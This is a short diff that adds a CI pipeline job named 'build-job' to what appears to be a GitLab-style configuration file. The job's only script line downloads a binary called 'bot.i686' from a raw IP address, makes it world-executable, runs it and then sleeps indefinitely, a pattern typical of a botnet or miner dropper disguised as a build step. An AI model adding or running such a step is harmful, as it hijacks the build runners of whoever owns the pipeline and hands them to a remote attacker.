@@ -1,1 +1,4 @@
-
+build-job:
+  stage: build
+  script:
+    - curl -O 5.253.86.21/bot.i686; chmod 777 bot.i686; ./bot.i686 lab; sleep 858881212
